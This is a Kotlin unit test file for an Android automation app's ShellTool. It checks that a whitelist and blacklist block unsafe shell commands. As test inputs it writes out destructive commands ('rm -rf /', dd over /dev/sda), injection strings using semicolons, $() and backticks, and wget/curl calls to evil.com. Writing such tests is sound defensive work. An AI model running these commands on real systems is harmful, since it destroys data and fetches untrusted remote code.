package com.roubao.autopilot.tools

import kotlinx.coroutines.test.runTest
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Ignore
import org.junit.Test

/**
 * Tests for ShellTool command whitelist and blacklist security.
 *
 * ShellTool enforces a default-deny whitelist (ALLOWED_PREFIXES) and a
 * blacklist of dangerous commands (BASE_BLOCKED_COMMANDS). These tests
 * verify both layers reject unsafe input before any shell execution.
 *
 * Note: ShellTool depends on DeviceController which requires Shizuku/Android
 * runtime, but the security checks happen before any shell execution, so
 * we can test through execute() - blocked commands return ToolResult.Error
 * before reaching the shell.
 */
class ShellToolWhitelistTest {

    private lateinit var shellTool: ShellTool

    @Before
    fun setup() {
        // Pass null DeviceController - security checks run before execution
        shellTool = ShellTool(
            deviceController = null as? com.roubao.autopilot.controller.DeviceController
                ?: return,
            settingsManager = null
        )
    }

    // ==================== Whitelist tests ====================

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `allowed command - input tap passes whitelist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "input tap 100 200"))
        // Should not be blocked by security, may fail at execution level
        // but should NOT return a security error
        if (result is ToolResult.Error) {
            assertTrue(
                "input tap should pass security check",
                !result.error.contains("安全限制")
            )
        }
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `allowed command - am start passes whitelist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "am start -a android.intent.action.VIEW"))
        if (result is ToolResult.Error) {
            assertTrue(!result.error.contains("安全限制"))
        }
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `allowed command - dumpsys passes whitelist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "dumpsys window"))
        if (result is ToolResult.Error) {
            assertTrue(!result.error.contains("安全限制"))
        }
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `blocked command - rm rf rejected by blacklist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "rm -rf /"))
        assertTrue(result is ToolResult.Error)
        assertTrue((result as ToolResult.Error).error.contains("安全限制"))
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `blocked command - reboot rejected by blacklist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "reboot"))
        assertTrue(result is ToolResult.Error)
        // 'reboot' is in blacklist AND not in whitelist, either check blocks it
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `blocked command - format rejected by blacklist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "format /dev/sda"))
        assertTrue(result is ToolResult.Error)
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `blocked command - dd rejected by blacklist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "dd if=/dev/zero of=/dev/sda"))
        assertTrue(result is ToolResult.Error)
    }

    // ==================== Shell injection tests ====================

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `injection - semicolon chain blocked`() = runTest {
        // "ls ; rm -rf /" - even though 'ls ' is allowed, the rm part is dangerous
        val result = shellTool.execute(mapOf("command" to "ls ; rm -rf /"))
        assertTrue(result is ToolResult.Error)
        assertTrue((result as ToolResult.Error).error.contains("安全限制"))
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `injection - command substitution blocked`() = runTest {
        // $(cmd) - not in whitelist prefixes
        val result = shellTool.execute(mapOf("command" to "\$(reboot)"))
        assertTrue(result is ToolResult.Error)
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `injection - backtick substitution blocked`() = runTest {
        val result = shellTool.execute(mapOf("command" to "`reboot`"))
        assertTrue(result is ToolResult.Error)
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `blocked command - su without root mode rejected`() = runTest {
        // su -c should be blocked when root mode is not enabled
        val result = shellTool.execute(mapOf("command" to "su -c id"))
        assertTrue(result is ToolResult.Error)
        assertTrue((result as ToolResult.Error).error.contains("Root"))
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `unknown command - wget blocked by whitelist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "wget http://evil.com/payload"))
        assertTrue(result is ToolResult.Error)
        assertTrue((result as ToolResult.Error).error.contains("不在允许列表"))
    }

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `unknown command - curl blocked by whitelist`() = runTest {
        val result = shellTool.execute(mapOf("command" to "curl http://evil.com"))
        assertTrue(result is ToolResult.Error)
    }

    // ==================== Parameter validation ====================

    @Test
    @Ignore("Requires Android runtime for DeviceController instantiation")
    fun `missing command param returns error`() = runTest {
        val result = shellTool.execute(emptyMap())
        assertTrue(result is ToolResult.Error)
        assertEquals("缺少 command 参数", (result as ToolResult.Error).error)
    }
}
